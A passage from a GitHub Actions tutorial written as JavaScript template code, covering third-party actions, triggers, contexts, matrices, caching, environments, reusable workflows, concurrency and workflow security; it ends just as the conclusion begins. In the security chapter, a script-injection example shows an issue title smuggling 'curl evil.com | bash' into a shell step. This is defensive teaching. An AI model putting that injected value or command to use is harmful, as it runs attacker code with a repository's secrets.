${sec("actions","06","📦","Using third-party actions",
"Leverage the massive ecosystem of 17,000+ pre-built actions from the GitHub Marketplace to avoid reinventing the wheel.",`

${theory("Understanding actions as reusable building blocks",`
<p>An <strong>action</strong> is a packaged, reusable unit of automation code. Instead of writing 20 lines of shell commands to set up Python with caching, you use a single line: <code>uses: actions/setup-python@v5</code>. The action handles all the complexity internally.</p>
<p>Actions come in three flavors:</p>
<ul>
<li><strong>JavaScript actions</strong> — Written in Node.js, run directly on the runner. Fastest startup time.</li>
<li><strong>Docker actions</strong> — Packaged in a Docker container. Guarantees exact environment but has slower startup.</li>
<li><strong>Composite actions</strong> — Made of YAML steps. No coding required — just compose existing steps (we'll build these in Chapter 15).</li>
</ul>
<p>You reference actions using the syntax <code>owner/repo@ref</code>. The <code>@ref</code> can be a version tag (<code>@v4</code>), a branch (<code>@main</code>), or a commit SHA — each with different security implications.</p>
`)}

${code("Action reference formats","yaml",`steps:
  # Major version tag — most common, auto-gets patches
  - uses: actions/checkout@v4

  # Exact commit SHA — most secure, immune to tag hijacking
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608

  # Docker Hub image — run any container as an action
  - uses: docker://alpine:3.18

  # Local action — from the same repository
  - uses: ./.github/actions/my-custom-action`)}

<h3>Essential Python DevOps actions</h3>
${code("Complete pipeline with third-party actions","yaml",`jobs:
  full-pipeline:
    runs-on: ubuntu-latest
    steps:
      # 1. Get your code
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # 2. Setup Python with automatic pip caching
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      # 3-6. Quality checks
      - run: pip install -r requirements.txt
      - run: flake8 . --count --show-source --statistics
      - run: black --check .
      - run: pytest --cov=app --cov-report=xml -v

      # 7. Upload coverage report
      - uses: codecov/codecov-action@v3
        with:
          files: ./coverage.xml
          fail_ci_if_error: true

      # 8. Build Docker image
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          tags: myapp:test

      # 9. Notify on failure
      - uses: slackapi/slack-github-action@v1.25.0
        if: failure()
        with:
          payload: |
            {"text":"❌ CI Failed on \${{ github.repository }}"}
        env:
          SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`)}

${callout("danger","Security: always pin your actions","Never use <code>@main</code> or <code>@master</code> for third-party actions in production. If that repository is compromised, malicious code runs with your secrets. At minimum use version tags (<code>@v4</code>). For maximum security, pin to a commit SHA.")}
`)}

<!-- ═══════ 7. EVENT FILTERS ═══════ -->
${sec("filters","07","🔍","Event filters & activity types",
"Fine-tune exactly which events trigger your workflows using branch filters, path filters, and activity type selectors to eliminate unnecessary runs.",`

${theory("Why filtering matters",`
<p>Without filters, every push to any branch triggers your CI — even if someone edited only a README file. This wastes runner minutes, slows down feedback, and floods the Actions tab with irrelevant runs.</p>
<p>GitHub provides three filtering mechanisms:</p>
<ul>
<li><strong>Branch/tag filters</strong> — Run only when specific branches or tags are affected. Supports glob patterns like <code>release/**</code>.</li>
<li><strong>Path filters</strong> — Run only when specific files or directories change. Essential for monorepos.</li>
<li><strong>Activity types</strong> — For events with sub-types (like pull_request), choose exactly which sub-events trigger the workflow (opened, synchronize, labeled, etc.).</li>
</ul>
`)}

${code("Comprehensive filtering examples","yaml",`on:
  push:
    # Branch filters with glob patterns
    branches:
      - main
      - "release/**"           # release/1.0, release/2.0
      - "!release/**-beta"     # Exclude beta releases
    tags:
      - "v*"                   # v1.0, v2.1.3
    # Path filters — trigger only if these files change
    paths:
      - "src/**"
      - "tests/**"
      - "requirements.txt"
    # OR: ignore these paths instead
    paths-ignore:
      - "docs/**"
      - "**.md"
      - ".gitignore"

  pull_request:
    branches: [main]
    # Activity types: which PR events trigger this?
    types:
      - opened               # New PR created
      - synchronize          # New commits pushed to PR
      - reopened             # Closed PR reopened
      # NOT triggered by: labeled, assigned, etc.

  issues:
    types: [opened, labeled]

  release:
    types: [published]       # Only published, not drafted`)}

<h3>Real-world monorepo filtering</h3>
<p class="desc">In a monorepo with multiple services, you only want to test the service that changed. Here's how:</p>
${code("Monorepo CI with path detection","yaml",`name: Monorepo CI
on:
  push:
    branches: [main]

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      api_changed: \${{ steps.filter.outputs.api }}
      frontend_changed: \${{ steps.filter.outputs.frontend }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v2
        id: filter
        with:
          filters: |
            api:
              - "api/**"
              - "shared/**"
            frontend:
              - "frontend/**"
              - "shared/**"

  test-api:
    needs: detect-changes
    if: needs.detect-changes.outputs.api_changed == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd api && pip install -r requirements.txt && pytest

  test-frontend:
    needs: detect-changes
    if: needs.detect-changes.outputs.frontend_changed == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd frontend && npm ci && npm test`)}
`)}

<!-- ═══════ 8. CONTEXTS ═══════ -->
${sec("contexts","08","📐","Contexts, expressions & variables",
"Access runtime information, define dynamic values, and use expressions to make your workflows data-driven and intelligent.",`

${theory("Understanding contexts",`
<p>Contexts are <strong>named objects containing runtime information</strong> that GitHub Actions makes available to your workflow. Think of them as read-only dictionaries you can query to learn about the current run.</p>
<p>You access context values using the <strong>expression syntax</strong>: <code>\${{ context.property }}</code>. This syntax can be used in any YAML value — step names, run commands, conditions, environment variables, and more.</p>
<p>The most important contexts are:</p>
<ul>
<li><strong>github</strong> — Repository name, branch, commit SHA, event details, actor (who triggered it)</li>
<li><strong>env</strong> — Environment variables defined at workflow, job, or step level</li>
<li><strong>secrets</strong> — Encrypted values stored in repo/org settings (masked in logs)</li>
<li><strong>vars</strong> — Non-sensitive configuration variables (visible in logs)</li>
<li><strong>runner</strong> — Info about the VM: OS, architecture, temp directory</li>
<li><strong>steps</strong> — Outputs and status of previous steps in the current job</li>
<li><strong>needs</strong> — Outputs and results of jobs this job depends on</li>
<li><strong>matrix</strong> — Current matrix combination values (Chapter 13)</li>
</ul>
`)}

${code("Contexts and expressions in practice","yaml",`jobs:
  demo:
    runs-on: ubuntu-latest
    env:
      DEPLOY_ENV: production

    steps:
      - uses: actions/checkout@v4

      # github context — who, what, where
      - name: GitHub context
        run: |
          echo "Repo: \${{ github.repository }}"
          echo "Branch: \${{ github.ref_name }}"
          echo "SHA: \${{ github.sha }}"
          echo "Actor: \${{ github.actor }}"
          echo "Event: \${{ github.event_name }}"
          echo "Run #: \${{ github.run_number }}"

      # runner context — the machine
      - name: Runner context
        run: |
          echo "OS: \${{ runner.os }}"
          echo "Arch: \${{ runner.arch }}"
          echo "Temp: \${{ runner.temp }}"

      # Secrets are masked with *** in logs
      - name: Using secrets safely
        env:
          API_KEY: \${{ secrets.API_KEY }}
        run: echo "Key is set: \${{ secrets.API_KEY != '' }}"

      # Expressions with operators
      - name: Conditional logic
        if: |
          github.event_name == 'push' &&
          github.ref == 'refs/heads/main' &&
          !contains(github.event.head_commit.message, '[skip ci]')
        run: echo "Running on main, no skip"

      # Setting and using step outputs
      - name: Set dynamic outputs
        id: vars
        run: |
          echo "version=1.2.3" >> \$GITHUB_OUTPUT
          echo "sha_short=\$(git rev-parse --short HEAD)" >> \$GITHUB_OUTPUT

      - name: Use step outputs
        run: |
          echo "v\${{ steps.vars.outputs.version }}"
          echo "sha: \${{ steps.vars.outputs.sha_short }}"`)}

${callout("info","secrets vs vars","<strong>secrets:</strong> Encrypted, masked in logs, for sensitive data (API keys, passwords, tokens). Set in Settings → Secrets.<br><strong>vars:</strong> Plain text, visible in logs, for configuration (URLs, app names, feature flags). Set in Settings → Variables.")}
`)}

<!-- ═══════ 9. FUNCTIONS ═══════ -->
${sec("functions","09","🧮","Functions",
"Use GitHub's built-in expression functions for conditional logic, string manipulation, JSON parsing, and cache key generation.",`

${theory("Built-in function categories",`
<p>GitHub Actions provides several categories of functions you can use inside <code>\${{ }}</code> expressions:</p>
<ul>
<li><strong>Status functions</strong> — <code>success()</code>, <code>failure()</code>, <code>always()</code>, <code>cancelled()</code> — check the outcome of previous steps or jobs</li>
<li><strong>String functions</strong> — <code>contains()</code>, <code>startsWith()</code>, <code>endsWith()</code>, <code>format()</code> — test and manipulate strings</li>
<li><strong>JSON functions</strong> — <code>toJSON()</code>, <code>fromJSON()</code> — convert between JSON and workflow values</li>
<li><strong>Hash functions</strong> — <code>hashFiles()</code> — generate a SHA-256 hash from file contents (essential for cache keys)</li>
</ul>
`)}

${code("Functions reference with examples","yaml",`jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      # ── Status functions ──
      - name: Always runs (cleanup, notifications)
        if: always()
        run: echo "Runs even if earlier steps failed"

      - name: Only on failure
        if: failure()
        run: echo "Something broke — send alert!"

      # ── String functions ──
      - name: String checks
        if: |
          contains(github.event.head_commit.message, '[deploy]') &&
          startsWith(github.ref, 'refs/heads/release')
        run: echo "Deploy triggered from release branch"

      - name: Format strings
        run: |
          echo "\${{ format('Deploying {0} to {1}', 'v2.0', 'prod') }}"

      # ── JSON functions ──
      - name: Create JSON output
        id: meta
        run: |
          echo 'config={"env":"prod","replicas":3}' >> \$GITHUB_OUTPUT

      - name: Parse JSON in expressions
        run: |
          echo "Env: \${{ fromJSON(steps.meta.outputs.config).env }}"
          echo "Replicas: \${{ fromJSON(steps.meta.outputs.config).replicas }}"

      # ── Debug with toJSON ──
      - name: Dump entire github context
        run: echo '\${{ toJSON(github) }}'

      # ── hashFiles for cache keys ──
      - uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements.txt') }}`)}
`)}

<!-- ═══════ 10. EXECUTION FLOW ═══════ -->
${sec("flow","10","🔀","Controlling execution flow",
"Master job dependencies, conditional execution, error handling, timeouts, and retry strategies to build robust pipelines.",`

${theory("Designing your pipeline topology",`
<p>By default, all jobs in a workflow run <strong>in parallel</strong>. The <code>needs:</code> keyword creates dependencies between jobs, forcing them to run sequentially. This lets you design multi-stage pipelines where each stage gates the next.</p>
<p>A typical production pipeline has this shape:</p>
<ul>
<li><strong>Stage 1 (parallel):</strong> Lint + Test + Security scan — all run simultaneously for fast feedback</li>
<li><strong>Stage 2 (sequential):</strong> Build — only if all Stage 1 jobs pass</li>
<li><strong>Stage 3 (sequential):</strong> Deploy to staging — only if build succeeds</li>
<li><strong>Stage 4 (sequential):</strong> Deploy to production — only if staging succeeds, often with manual approval</li>
<li><strong>Stage 5 (always):</strong> Notify — runs regardless of upstream success/failure</li>
</ul>
`)}

${diagram(`  ┌──────┐  ┌──────┐  ┌──────────┐
  │ Lint │  │ Test │  │ Security │   ← Stage 1: Parallel
  └──┬───┘  └──┬───┘  └────┬─────┘
     │         │            │
     └─────────┼────────────┘
               │
          ┌────▼────┐
          │  Build  │                ← Stage 2: needs:[lint,test,security]
          └────┬────┘
               │
        ┌──────▼──────┐
        │   Staging   │              ← Stage 3: needs:[build] + environment
        └──────┬──────┘
               │
      ┌────────▼────────┐
      │   Production    │            ← Stage 4: needs:[staging] + approval
      └────────┬────────┘
               │
          ┌────▼────┐
          │ Notify  │  if: always()  ← Always runs
          └─────────┘`)}

${code("Full pipeline with dependencies and conditions","yaml",`name: Production Pipeline
on:
  push:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install flake8 black
      - run: flake8 . && black --check .

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt

  build:
    needs: [lint, test, security]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp:\${{ github.sha }} .

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: echo "Deploying to staging..."

  deploy-production:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo "Deploying to production!"

  notify:
    needs: [deploy-production]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Result: \${{ needs.deploy-production.result }}"`)}

<h3>Step-level control patterns</h3>
${code("Conditions, timeouts, retries","yaml",`steps:
  - name: Main branch only
    if: github.ref == 'refs/heads/main'
    run: echo "On main"

  - name: Skip if commit says [skip ci]
    if: "!contains(github.event.head_commit.message, '[skip ci]')"
    run: echo "Running CI..."

  - name: Optional lint (don't fail the build)
    continue-on-error: true
    run: flake8 . --count

  - name: Test with timeout
    timeout-minutes: 10
    run: pytest tests/integration/ -v

  - name: Flaky test with retry
    uses: nick-fields/retry@v2
    with:
      timeout_minutes: 5
      max_attempts: 3
      command: pytest tests/flaky/ -v`)}
`)}

<!-- ═══════ 11. INPUTS & OUTPUTS ═══════ -->
${sec("io","11","↔️","Inputs & outputs",
"Pass data between steps, between jobs, and accept rich user inputs from manual workflow triggers.",`

${theory("How data flows through a pipeline",`
<p>Data flows in GitHub Actions follow strict scoping rules:</p>
<ul>
<li><strong>Step → Step (same job):</strong> Use <code>\$GITHUB_OUTPUT</code> to set outputs, then <code>\${{ steps.STEP_ID.outputs.KEY }}</code> to read them. Since steps share a filesystem, you can also write to files.</li>
<li><strong>Job → Job:</strong> Declare outputs at the job level using <code>outputs:</code>, then read them in dependent jobs via <code>\${{ needs.JOB_ID.outputs.KEY }}</code>. No filesystem sharing — only string values.</li>
<li><strong>User → Workflow:</strong> Use <code>workflow_dispatch</code> inputs. GitHub renders a form in the UI where users can fill in values before triggering the run.</li>
</ul>
`)}

${code("Step-to-step and job-to-job outputs","yaml",`jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: \${{ steps.extract.outputs.version }}
      image_tag: \${{ steps.tag.outputs.image_tag }}
    steps:
      - uses: actions/checkout@v4
      - name: Extract version
        id: extract
        run: |
          VERSION="1.2.3"
          echo "version=\$VERSION" >> \$GITHUB_OUTPUT

      - name: Create image tag
        id: tag
        run: |
          TAG="\${{ steps.extract.outputs.version }}-\${{ github.sha }}"
          echo "image_tag=\$TAG" >> \$GITHUB_OUTPUT

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Deploying v\${{ needs.build.outputs.version }}"
          echo "Image: \${{ needs.build.outputs.image_tag }}"`)}

${code("Manual trigger with rich inputs","yaml",`on:
  workflow_dispatch:
    inputs:
      target_env:
        description: "Target environment"
        required: true
        type: choice
        options: [development, staging, production]
      app_version:
        description: "Version to deploy"
        required: true
        type: string
      run_migrations:
        description: "Run database migrations?"
        type: boolean
        default: false

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "🚀 Deploying v\${{ inputs.app_version }}"
          echo "   to \${{ inputs.target_env }}"
      - if: inputs.run_migrations == true
        run: echo "Running migrations..."`)}
`)}

<!-- ═══════ 12. CACHING & ARTIFACTS ═══════ -->
${sec("caching","12","💾","Caching & artifacts",
"Speed up workflows by caching dependencies between runs, and share build outputs between jobs using artifacts.",`

${theory("Cache vs artifacts — when to use which",`
<p>These two features sound similar but serve very different purposes:</p>
<ul>
<li><strong>Cache</strong> is for <strong>speeding up workflows</strong>. It stores files (like pip/npm packages) between workflow runs so you don't re-download them every time. Caches are keyed by a hash of your dependency files — when requirements.txt changes, the cache invalidates. Caches expire after 7 days of no access.</li>
<li><strong>Artifacts</strong> are for <strong>sharing files between jobs</strong> or <strong>persisting output after a run</strong>. Test reports, coverage files, build outputs, Docker images — anything you want to download from the Actions UI or pass to a downstream job. Artifacts can be retained for up to 90 days.</li>
</ul>
`)}

${table(["Feature","Cache","Artifacts"],
[["Purpose","Speed up repeated installs","Share files between jobs / persist outputs"],
["Lifetime","7 days since last access","1-90 days (configurable)"],
["Key mechanism","Hash-based key matching","Named upload/download"],
["Size limit","10 GB per repo","500 MB per artifact (configurable)"],
["Downloadable from UI","No","Yes"],
["Use case","pip/npm packages, build tools","Test reports, Docker images, coverage"]])}

${code("Caching pip dependencies","yaml",`jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Method 1: Built-in cache in setup-python
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      # Method 2: Explicit cache action (more control)
      - uses: actions/cache@v3
        id: pip-cache
        with:
          path: ~/.cache/pip
          key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements.txt') }}
          restore-keys: pip-\${{ runner.os }}-

      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v`)}

${code("Sharing artifacts between jobs","yaml",`jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: pytest --cov=. --cov-report=html -v

      - uses: actions/upload-artifact@v4
        with:
          name: coverage-report
          path: htmlcov/
          retention-days: 30

  review:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: coverage-report
          path: ./coverage
      - run: ls -la coverage/`)}
`)}

<!-- ═══════ 13. MATRICES ═══════ -->
${sec("matrix","13","📊","Working with matrices",
"Run the same job across multiple configurations simultaneously — Python versions, operating systems, database backends, and more.",`

${theory("What is a matrix strategy?",`
<p>A matrix strategy automatically creates <strong>multiple copies of a job</strong>, each with different variable values. If you define a matrix with 3 Python versions and 2 operating systems, GitHub creates 6 jobs (3×2) that all run in parallel.</p>
<p>This is incredibly powerful for:</p>
<ul>
<li><strong>Cross-version testing:</strong> Ensure your code works on Python 3.9, 3.10, 3.11, and 3.12</li>
<li><strong>Cross-platform testing:</strong> Verify behavior on Linux, Windows, and macOS</li>
<li><strong>Database compatibility:</strong> Test against PostgreSQL, MySQL, and SQLite</li>
</ul>
<p>You can further refine with <code>include:</code> (add extra combinations), <code>exclude:</code> (skip specific combos), <code>fail-fast:</code> (stop all if one fails), and <code>max-parallel:</code> (limit concurrency).</p>
`)}

${code("Matrix strategies from basic to advanced","yaml",`jobs:
  # Basic: 4 Python versions × 3 OS = 12 parallel jobs
  test:
    strategy:
      matrix:
        python-version: ["3.9", "3.10", "3.11", "3.12"]
        os: [ubuntu-latest, windows-latest, macos-latest]
      fail-fast: false
      max-parallel: 6
    runs-on: \${{ matrix.os }}
    name: Py\${{ matrix.python-version }} / \${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python-version }}
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v

  # Advanced: include/exclude specific combinations
  advanced:
    strategy:
      matrix:
        python-version: ["3.10", "3.11", "3.12"]
        database: [postgres, sqlite]
        include:
          - python-version: "3.12"
            database: postgres
            experimental: true
        exclude:
          - python-version: "3.10"
            database: postgres
    runs-on: ubuntu-latest
    continue-on-error: \${{ matrix.experimental || false }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python-version }}
      - run: pytest -v
        env:
          DB_TYPE: \${{ matrix.database }}

  # Dynamic matrix generated from JSON
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: \${{ steps.set.outputs.matrix }}
    steps:
      - id: set
        run: |
          echo 'matrix={"include":[
            {"service":"api","path":"services/api"},
            {"service":"worker","path":"services/worker"}
          ]}' >> \$GITHUB_OUTPUT

  test-services:
    needs: prepare
    strategy:
      matrix: \${{ fromJSON(needs.prepare.outputs.matrix) }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd \${{ matrix.path }} && pytest -v`)}
`)}

<!-- ═══════ 14. ENVIRONMENTS ═══════ -->
${sec("envs","14","🌍","Environments",
"Add deployment protection rules, scoped secrets, manual approvals, and deployment tracking to your workflows.",`

${theory("Environments as deployment gates",`
<p>Environments are a GitHub feature that lets you define <strong>deployment targets</strong> with protection rules. When a job references an environment, GitHub can enforce:</p>
<ul>
<li><strong>Required reviewers:</strong> Specific people must approve before the job runs. Essential for production deployments.</li>
<li><strong>Wait timer:</strong> A delay (e.g., 5 minutes) before the job starts — gives time to cancel accidental deploys.</li>
<li><strong>Branch restrictions:</strong> Only allow deployments from specific branches (e.g., only <code>main</code> can deploy to production).</li>
<li><strong>Environment-specific secrets:</strong> Different API keys for staging vs production, scoped so staging workflows can't access production credentials.</li>
</ul>
<p>Configure environments in <strong>Settings → Environments</strong> in your repository.</p>
`)}

${code("Environments in action","yaml",`jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.myapp.com
    steps:
      - uses: actions/checkout@v4
      - env:
          AWS_KEY: \${{ secrets.AWS_ACCESS_KEY }}
        run: echo "Deploying to staging..."

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ghcr.io/\${{ github.repository }}:latest
            ghcr.io/\${{ github.repository }}:\${{ github.sha }}`)}
`)}

<!-- ═══════ 15. CUSTOM ACTIONS ═══════ -->
${sec("custom","15","⚙️","Developing custom actions from scratch",
"Build your own reusable actions — composite (YAML-only), Docker, and JavaScript — to encapsulate complex logic into single-line invocations.",`

${theory("Three types of custom actions",`
<ul>
<li><strong>Composite actions</strong> — Written in pure YAML by combining existing steps. No programming required. Best for: wrapping common step sequences (setup + install + test) into a reusable package.</li>
<li><strong>Docker container actions</strong> — Packaged as a Docker image. Your action runs in an isolated container with exactly the tools you need. Best for: complex tooling with specific OS-level dependencies.</li>
<li><strong>JavaScript actions</strong> — Written in Node.js using the <code>@actions/core</code> and <code>@actions/github</code> libraries. Fastest startup. Best for: interacting with the GitHub API, complex logic, maximum performance.</li>
</ul>
`)}

<h3>Composite action — YAML only, no coding</h3>
${code(".github/actions/python-setup/action.yml","yaml",`name: "Python Setup & Test"
description: "Sets up Python, installs deps, runs tests"

inputs:
  python-version:
    description: "Python version"
    required: false
    default: "3.11"
  requirements-file:
    description: "Path to requirements"
    required: false
    default: "requirements.txt"

outputs:
  test-result:
    description: "Test outcome"
    value: \${{ steps.test.outputs.result }}

runs:
  using: "composite"
  steps:
    - uses: actions/setup-python@v5
      with:
        python-version: \${{ inputs.python-version }}
        cache: "pip"

    - shell: bash
      run: |
        python -m pip install --upgrade pip
        pip install -r \${{ inputs.requirements-file }}
        pip install pytest pytest-cov

    - id: test
      shell: bash
      run: |
        if pytest --cov -v; then
          echo "result=success" >> \$GITHUB_OUTPUT
        else
          echo "result=failure" >> \$GITHUB_OUTPUT
          exit 1
        fi`)}

${code("Using your custom composite action","yaml",`jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup and test
        id: test
        uses: ./.github/actions/python-setup
        with:
          python-version: "3.12"
      - run: echo "Result: \${{ steps.test.outputs.test-result }}"`)}

<!-- ═══════ 16. REUSABLE WORKFLOWS ═══════ -->
${sec("reusable","16","♻️","Creating reusable workflows",
"Define entire workflows as callable templates — the CI/CD equivalent of functions — to standardize pipelines across your organization.",`

${theory("Reusable workflows vs custom actions",`
<p>Custom actions (Chapter 15) encapsulate <strong>steps</strong>. Reusable workflows encapsulate entire <strong>jobs</strong> — complete with their own runner definitions, services, environment references, and multi-step logic.</p>
<p>Use reusable workflows when:</p>
<ul>
<li>You want to <strong>standardize an entire CI pipeline</strong> across 50 repositories in your org</li>
<li>The reusable unit needs <strong>its own runner type</strong> or <strong>service containers</strong></li>
<li>You need <strong>job-level outputs</strong> that feed into downstream jobs in the caller</li>
</ul>
<p>A reusable workflow uses <code>on: workflow_call</code> as its trigger, and the caller invokes it with <code>uses:</code> at the job level (not the step level).</p>
`)}

${code("Reusable workflow definition","yaml",`name: Reusable Python CI
on:
  workflow_call:
    inputs:
      python-version:
        type: string
        default: "3.11"
      run-security:
        type: boolean
        default: true
    secrets:
      deploy-token:
        required: true
    outputs:
      test-result:
        value: \${{ jobs.test.outputs.result }}

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      result: \${{ steps.test.outputs.result }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ inputs.python-version }}
          cache: "pip"
      - run: pip install -r requirements.txt
      - id: test
        run: pytest -v && echo "result=pass" >> \$GITHUB_OUTPUT

  security:
    if: inputs.run-security
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety && safety check -r requirements.txt`)}

${code("Calling the reusable workflow","yaml",`name: Deploy Pipeline
on:
  push:
    branches: [main]

jobs:
  ci:
    uses: ./.github/workflows/reusable-python-ci.yml
    with:
      python-version: "3.12"
      run-security: true
    secrets:
      deploy-token: \${{ secrets.DEPLOY_TOKEN }}

  deploy:
    needs: ci
    runs-on: ubuntu-latest
    steps:
      - run: echo "Tests: \${{ needs.ci.outputs.test-result }}"`)}
`)}

<!-- ═══════ 17. CONCURRENCY ═══════ -->
${sec("concurrency","17","🔒","Managing concurrency",
"Prevent conflicting simultaneous runs — cancel outdated CI, queue deployments, and isolate PR checks from each other.",`

${theory("Why concurrency control matters",`
<p>Without concurrency control, pushing 5 commits rapidly triggers 5 separate workflow runs, all competing for resources. For CI, this wastes minutes. For deployments, it's dangerous — two simultaneous deploys can corrupt your infrastructure.</p>
<p>GitHub Actions provides the <code>concurrency</code> key with two settings:</p>
<ul>
<li><strong>group:</strong> A string that identifies runs that should be mutually exclusive. Runs in the same group cannot execute simultaneously.</li>
<li><strong>cancel-in-progress:</strong> If <code>true</code>, starting a new run cancels any currently running job in the same group. If <code>false</code>, the new run queues until the current one finishes.</li>
</ul>
<p><strong>Rule of thumb:</strong> Use <code>cancel-in-progress: true</code> for CI (only latest code matters). Use <code>cancel-in-progress: false</code> for deployments (never interrupt a deploy mid-flight).</p>
`)}

${code("Concurrency patterns","yaml",`# ── Pattern 1: Cancel outdated CI runs ──
name: CI
on: [push, pull_request]
concurrency:
  group: ci-\${{ github.ref }}
  cancel-in-progress: true

# ── Pattern 2: Queue deployments ──
name: Deploy
on:
  push:
    branches: [main]
concurrency:
  group: deploy-production
  cancel-in-progress: false    # NEVER cancel deploys

# ── Pattern 3: Per-PR isolation ──
name: PR Checks
on: pull_request
concurrency:
  group: pr-\${{ github.event.pull_request.number }}
  cancel-in-progress: true

# ── Pattern 4: Job-level concurrency ──
jobs:
  test:
    runs-on: ubuntu-latest     # No limit — tests run freely
    steps:
      - run: pytest -v

  deploy:
    needs: test
    concurrency:               # But deploys are serialized
      group: deploy-\${{ github.ref }}
      cancel-in-progress: false
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."`)}

${callout("danger","Never cancel deployments","Always use <code>cancel-in-progress: false</code> for deployment jobs. Cancelling a deployment mid-flight can leave your application in an inconsistent state — half the servers running new code, half running old code.")}
`)}

<!-- ═══════ 18. SECURITY ═══════ -->
${sec("security","18","🛡️","Workflow security",
"Protect your pipelines from supply chain attacks, secret leaks, script injection, and privilege escalation — the most critical chapter in this guide.",`

${theory("The threat landscape",`
<p>GitHub Actions workflows have access to your secrets, your code, your deployment infrastructure, and often cloud provider credentials. A compromised workflow is a direct path to a production breach. The main threats are:</p>
<ul>
<li><strong>Supply chain attacks:</strong> A third-party action you use gets compromised. If you reference <code>@main</code>, attackers can push malicious code that runs with your secrets.</li>
<li><strong>Script injection:</strong> User-controlled data (PR titles, issue bodies, commit messages) gets interpolated into <code>run:</code> commands, allowing arbitrary code execution.</li>
<li><strong>Excessive permissions:</strong> Workflows that default to <code>write-all</code> when they only need <code>read</code> access.</li>
<li><strong>Secret exfiltration:</strong> Malicious PRs from forks can try to steal secrets via <code>pull_request_target</code> workflows.</li>
</ul>
`)}

<h3>Principle of least privilege</h3>
${code("Locking down permissions","yaml",`# Set restrictive defaults for the entire workflow
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # Inherits read-only — can't modify repo
    steps:
      - uses: actions/checkout@v4
      - run: pytest -v

  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write          # Only this job can push packages
    steps:
      - run: echo "Publishing..."`)}

<h3>Preventing script injection</h3>
${code("Safe vs vulnerable patterns","yaml",`# ❌ VULNERABLE — user input becomes shell code
- run: echo "\${{ github.event.issue.title }}"
  # If title is:  test"; curl evil.com | bash; echo "
  # Shell executes: echo "test"; curl evil.com | bash; echo ""

# ✅ SAFE — user input stays as a string
- env:
    TITLE: \${{ github.event.issue.title }}
  run: echo "\$TITLE"`)}

<h3>OIDC — passwordless cloud access</h3>
${code("No long-lived AWS keys needed","yaml",`jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/gh-actions
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-bucket/`)}

${callout("danger","The four cardinal rules of Actions security",`
<strong>1.</strong> Pin third-party actions to commit SHAs, not tags or branches.<br>
<strong>2.</strong> Never interpolate untrusted data in <code>run:</code> — always use env vars.<br>
<strong>3.</strong> Never use <code>pull_request_target</code> + checkout on the PR branch together.<br>
<strong>4.</strong> Set <code>permissions: contents: read</code> at workflow level and grant write access only where needed.
`)}
`)}

<!-- ═══════ 19. CONCLUSION ═══════ -->
${sec("conclusion","19","🎓","Conclusion",
"Everything you've learned, condensed into a complete production pipeline and a roadmap for what to learn next.",`

<h3>The complete production-grade pipeline</h3>
